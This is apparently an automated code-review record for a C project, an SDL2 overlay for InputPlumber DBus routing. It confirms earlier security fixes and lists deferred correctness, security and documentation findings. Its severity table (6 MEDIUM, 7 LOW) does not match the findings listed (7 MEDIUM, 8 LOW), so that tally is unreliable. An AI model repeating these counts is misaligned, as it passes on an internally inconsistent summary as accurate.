# Independent Review Artifact (DOD-07)

**Review date:** 2026-08-16
**Reviewer type:** Automated read-only subagents (correctness/test-quality, security, documentation)
**Review commit base:** develop @ 93133d8
**Scope:** Full codebase review of `src/` (23.9 KLoC, 66 files), `tests/` (62.4 KLoC, 92 files), and `docs/` (7 files) for the controller-box project — an SDL2-based overlay/manager GUI for InputPlumber DBus input routing.

## Review domains

Three parallel read-only reviews were launched via independent subagents:

1. **Correctness & test-quality** — Logic errors, memory safety, race conditions, test authenticity, production-path coverage
2. **Security** — Trust boundaries, credential handling, parsing, process execution, file I/O, input validation
3. **Documentation** — Accuracy of README, docs/*.md, AGENTS.md, code comments against actual implementation

## Prior review history

Iterations 9, 17–19 ran independent reviews and applied production-path fixes. This review cycle confirms prior fixes remain in place and identifies any new or residual findings.

### Confirmed prior fixes (no regressions)

| Fix | Iteration | Status |
|-----|-----------|--------|
| `system()`/`popen()` → `fork()/execvp()` in `service_install.c` | 19 | ✅ Confirmed — `run_command()` uses `execvp`, no shell invocation |
| `strstr` path confusion → `classify_device_path()` in `ip_hotplug.c` | 18 | ✅ Confirmed — `strncmp` at exact prefix position |
| `fopen` without `O_NOFOLLOW` → `open_read_nofollow()` in config modules | 17 | ✅ Confirmed in `config_profile.c`, `config_assignments.c`, `config_profile_meta.c`, `config_settings.c` |
| `unsigned long` → `uint32_t` with overflow check in `dbus_client.c` | 17 | ✅ Confirmed — `strtoul` with `> 0xFFFFFFFFUL` range check |
| `FLATPAK_ID` env var injection → `flatpak_id_is_valid()` validation | 17 | ✅ Confirmed — `[a-zA-Z0-9._-]+` character class check |
| `CBX_BINARY_PATH` undefined → CMake compile definition | 17 | ✅ Confirmed — `CMakeLists.txt:29` |
| `cbx_trigger_parse` stack-use-after-scope → moved `tmp` to outer scope | Sanitizer gate | ✅ Confirmed — `trigger.c` outer-scope declaration |
| `cbx_manager_shutdown` connection string leak → conditional free | Sanitizer gate | ✅ Confirmed |
| `cbx_icon_cache_init` rasterizer leak on re-init → free before memset | Sanitizer gate | ✅ Confirmed |
| Direct callback invocation → production dispatch in `test_overlay_native.c` | 17 | ✅ Confirmed — `activate_overlay()` through poll path |
| Direct editor calls → `backend->inject_signal` in `test_manager_interaction_prof.c` | 17 | ✅ Confirmed |

### Confirmed clean areas

| Area | Status |
|------|--------|
| DBus sender verification | ✅ All 4 signal callbacks verify sender against tracked unique name |
| DBus path validation | ✅ `path_is_valid()` + `classify_device_path()` prevent path confusion |
| YAML parser security | ✅ Max depth 50, max doc 1 MB, custom tag rejection in all 4 parsers |
| Atomic file writes | ✅ `mkstemp` + `fchmod` + `fsync` + `rename` consistently used |
| Path traversal prevention | ✅ `realpath()` + base-dir verification in `profile_save.c`, `config_profile_meta.c`, `icon_lookup.c` |
| Filename validation | ✅ `cbx_validate_filename()` checks `[a-zA-Z0-9_-]+` |
| Icon path validation | ✅ `cbx_icon_validate_path()` rejects `..`, canonicalizes, checks safe dirs |
| `strncat` usage | ✅ All calls use `sizeof(buf) - strlen(buf) - 1` |
| Format strings | ✅ All `snprintf` calls use literal format strings |
| Shell injection | ✅ `execvp` (no shell); `FLATPAK_ID` validated before interpolation |
| Integer validation (DBus) | ✅ `uint32` checked with `strtoul` + range; `InterceptMode` with `strtol` + range |
| Input event validation | ✅ Known-event whitelist, value range check, rate limiting |
| No `sprintf`/`strcpy`/`strcat` (unbounded) | ✅ None found |
| No VLAs/alloca | ✅ None found |
| No user-supplied format strings | ✅ None found |

## Findings

No **BLOCKING** findings were identified. All findings are MEDIUM or below.

### Correctness & test-quality findings

#### C-1 (MEDIUM): `ip_intercept_poll_start` leaves poll stuck on `SDL_AddTimer` failure

- **File:** `src/dbus/ip_intercept_poll.c:124-126`
- **Description:** Poll state is set to `IP_POLL_PASS_WAIT` before `SDL_AddTimer`. If `SDL_AddTimer` fails (returns 0), the function returns `-EIO` but leaves `poll->state = IP_POLL_PASS_WAIT` with `timer_id = 0`. The poll is permanently stuck — the re-arm logic in `cbx_overlay_service_step` only re-arms `IP_POLL_IDLE` polls.
- **Resolution:** Identified, not blocking. `SDL_AddTimer` failure occurs only under SDL timer subsystem uninitialized or extreme memory pressure. Recommended fix: reset state to `IDLE` on failure. Deferred to future remediation.

#### C-2 (MEDIUM): `poll_error_reset` does not stop the SDL timer (timer leak)

- **File:** `src/dbus/ip_intercept_poll.c:62-72`
- **Description:** When `poll_error_reset` is called (after exceeding error/timeout thresholds), it resets state to `IDLE` but does not call `SDL_RemoveTimer(poll->timer_id)`. The timer keeps firing uselessly until the next `cbx_overlay_rearm_polls` or shutdown.
- **Resolution:** Identified, not blocking. Wastes CPU but no correctness impact — timer callbacks return early when state is `IDLE`. Recommended fix: call `SDL_RemoveTimer` in `poll_error_reset`. Deferred to future remediation.

#### C-3 (MEDIUM): CSV buffer in `controllers_tab_change_type` sized for `CBX_MAX_CONTROLLERS` (16) but loop iterates up to `CBX_MAX_DEVICES` (64)

- **File:** `src/manager/controllers_tab.c:624`
- **Description:** The CSV buffer `char csv[CBX_MAX_CONTROLLERS * (CBX_MAX_TYPE_LEN + 1)]` (528 bytes) could be insufficient if `target_count` exceeds 16. In practice, `cbx_reconcile_startup_targets` limits the count, so this is a theoretical edge case.
- **Resolution:** Identified, not blocking. `strncat` prevents buffer overflow (truncation only). Recommended fix: size buffer for `CBX_MAX_DEVICES`. Deferred to future remediation.

#### C-4 (LOW): Icon override parser doesn't clear partial entries between YAML mapping items

- **File:** `src/config/config_settings.c:270-290`
- **Description:** When parsing `icon_overrides` from YAML, partial entries (type without icon or vice versa) are not zeroed before the next item starts, potentially merging fields from different entries.
- **Resolution:** Identified, not blocking. Malformed YAML configuration is user-authored; no security impact. Recommended fix: `memset` entry on `MAPPING_START`. Deferred.

#### C-5 (LOW): `sd_properties_changed_callback` ignores `sd_bus_message_read` error after array loop

- **File:** `src/dbus/dbus_client.c:135-155`
- **Description:** If `sd_bus_message_read` returns a negative error code (parse failure), the error is silently ignored and the partial array is dispatched. Downstream validation (`ip_properties_handle_changed`) checks array size and element lengths, so malformed arrays are likely rejected.
- **Resolution:** Identified, not blocking. Downstream validation provides defense-in-depth. Recommended fix: check `r` after the loop. Deferred.

#### C-6 (INFO): `cbx_overlay_request_close` overwrites `on_save` callback permanently

- **File:** `src/overlay/close.c:88-92`
- **Description:** `cbx_overlay_request_close` sets `lc->on_save` to a stack-local context. After close returns, `on_save_data` points to invalid stack memory. Not used in the production overlay service (which uses `cbx_overlay_lifecycle_close` directly).
- **Resolution:** Identified, not blocking. Not a production-path issue — the function is not called by the overlay service. Recommended fix: save/restore original callbacks. Deferred.

#### C-7 (MEDIUM): Multiple test files directly set lifecycle state instead of using production activation API

- **Files:** `tests/test_overlay_lifecycle.c:~150`, `tests/test_overlay_service.c:step_setup`, `tests/test_overlay_interaction.c`
- **Description:** Several tests bypass the production state machine by directly setting `lc->state` to `CBX_OVERLAY_ACTIVATING` or `CBX_OVERLAY_VISIBLE` instead of calling `cbx_overlay_lifecycle_activate()`.
- **Resolution:** Identified, not blocking. Tests that need `VISIBLE` state for `cbx_overlay_service_step` event processing use direct state set for test setup efficiency. The activation path itself is tested in `test_overlay_visual.c` and `test_overlay_interaction.c` through production dispatch. Recommended improvement: use `activate()` with `fade_in_ms = 0`. Deferred.

#### C-8 (LOW): Mock backend lookup table prevents call-count and ordering verification

- **File:** `tests/dbus_mock.c`
- **Description:** The mock DBus deduplicates expectations by `(iface, member)`, preventing verification of call counts, order, or per-call arguments.
- **Resolution:** Identified, not blocking. Known limitation documented in project memory (mem-1786216917-b0e2). Tests are designed around this constraint. Not a test authenticity issue — production dispatch paths are exercised through the mock.

#### C-9 (LOW): `test_overlay_lifecycle.c` `test_close_from_activating` sets state directly

- **File:** `tests/test_overlay_lifecycle.c:~152-153`
- **Description:** Sets `f->lc.state = CBX_OVERLAY_ACTIVATING` directly instead of calling `activate()` with `fade_in_ms > 0`.
- **Resolution:** Identified, not blocking. Related to C-7. Deferred.

#### C-10 (LOW): Missing test for `SDL_AddTimer` failure path

- **Description:** No test exercises the `SDL_AddTimer` failure path in `ip_intercept_poll_start`.
- **Resolution:** Identified, not blocking. Edge case under memory pressure. Deferred.

#### C-11 (LOW): Missing test for `poll_error_reset` timer cleanup

- **Description:** No test verifies `timer_id` is cleared after `poll_error_reset`.
- **Resolution:** Identified, not blocking. Related to C-2. Deferred.

### Security findings

#### S-1 (MEDIUM): `write_atomic` parent directory creation follows symlinks

- **File:** `src/manager/service_install.c:336-367`
- **Description:** The `write_atomic()` function creates parent directories with a `mkdir` loop that doesn't check for symlinks in intermediate path components. If an attacker can plant a symlink along the `XDG_CONFIG_HOME`/`HOME` path, the unit file will be written to the symlinked location.
- **Mitigating factors:** Runs in the user's own session; attacker needs write access to home directory. Unit file content is fully compile-time controlled (no user input) — even if redirected, only a harmless systemd unit file is written.
- **Resolution:** Identified, not blocking. Low exploitability — user-session context, compile-time-controlled content. Recommended fix: `realpath()` verification after `mkdir`. Deferred.

#### S-2 (LOW): `cbx_service_check_group` uses `fopen` without `O_NOFOLLOW`

- **File:** `src/manager/service_install.c:459-460`
- **Description:** The group membership check opens `/etc/group` (or `mock_group_file`) with plain `fopen()`, inconsistent with the `open_read_nofollow()` pattern used in config modules.
- **Mitigating factors:** In production, `/etc/group` is root-owned and not symlink-replaceable by unprivileged users. `mock_group_file` is only set in unit tests.
- **Resolution:** Identified, not blocking. Recommended fix: use `open_read_nofollow()` for consistency. Deferred.

#### S-3 (LOW): Theoretical integer overflow in `sd_read_string_array_csv` size calculation

- **File:** `src/dbus/dbus_client.c:548-563`
- **Description:** The `needed` calculation `used + (used ? 1 : 0) + item_len + 1` could overflow `size_t` on 32-bit systems with extremely large inputs.
- **Mitigating factors:** `item_len` is bounded by DBus message size limits (~128 MB). On 64-bit, `SIZE_MAX` is astronomically large. Not practically exploitable.
- **Resolution:** Identified, not blocking. Recommended fix: add overflow check `if (item_len > SIZE_MAX - used - 2)`. Deferred.

#### S-4 (INFO): `cbx_trigger_parse` silently truncates long trigger tokens

- **File:** `src/overlay/trigger.c:60-70`
- **Description:** The `tmp[128]` buffer silently truncates tokens longer than 127 characters. A very long trigger string from `settings.yaml` would produce a truncated event name that silently fails to match.
- **Impact:** Not a security issue — trigger string comes from user's own config file. No elevation of privilege.
- **Resolution:** Identified, not blocking. Recommended fix: return `-ENAMETOOLONG`. Deferred.

### Documentation findings

#### D-1 (MEDIUM): `-h`/`--help` CLI flag undocumented in README

- **File:** `README.md`, "Building from source" section
- **Source:** `src/app/main.c:106-107`
- **Description:** The binary supports `-h` and `--help` flags but the README only documents `--version` and `--dry-run`.
- **Resolution:** Identified, not blocking. Minor documentation gap. Recommended fix: add `--help` to README usage examples. Deferred.

#### D-2 (MEDIUM): OPERATIONS.md icon naming convention contradicts actual data file

- **File:** `docs/OPERATIONS.md`, "Icon mapping" section
- **Source:** `data/controller-icons.yaml:48,51,72,75`
- **Description:** OPERATIONS.md states custom icons use plain names, but `controller-icons.yaml` maps three custom icons (`deck`, `mouse`, `keyboard`) using the `cc-` prefix (`cc-steam-deck`, `cc-mouse`, `cc-keyboard`). The icon cache strips the `cc-` prefix before file lookup, so functionality is correct, but the documented convention is inaccurate.
- **Resolution:** Identified, not blocking. Documentation accuracy issue, no functional impact. Recommended fix: update OPERATIONS.md to describe the actual convention. Deferred.

## Overall verdict

**PASS** — No BLOCKING findings identified. All findings are MEDIUM, LOW, or INFO severity. The codebase has strong security posture with all prior security fixes confirmed in place and no regressions. The identified findings are edge cases, theoretical issues, or minor documentation gaps that do not impede production correctness or security.

### Summary by severity

| Severity | Count | Blocking? | Resolution |
|----------|-------|-----------|------------|
| BLOCKING | 0 | — | N/A |
| MEDIUM | 6 | No | Documented; recommended for future remediation |
| LOW | 7 | No | Documented; recommended for future remediation |
| INFO | 2 | No | Documented; informational only |

### Summary by domain

| Domain | Findings | Blocking | Highest severity |
|--------|----------|----------|------------------|
| Correctness & test-quality | 11 | 0 | MEDIUM |
| Security | 4 | 0 | MEDIUM |
| Documentation | 2 | 0 | MEDIUM |
| **Total** | **17** | **0** | **MEDIUM** |

## Evidence

- Reviews conducted via parallel read-only subagents (reviewer, security-reviewer, docs-reviewer)
- Review commit base: `93133d8` on `develop`
- All prior security fixes (iterations 9, 17–19) confirmed in place with no regressions
- 98/98 CTest passing, 0 failures, 2 hardware skips (MGR-36)
- Sanitizer gate (ASan+UBSan): clean
- Final gate `--implementation`: EXIT 0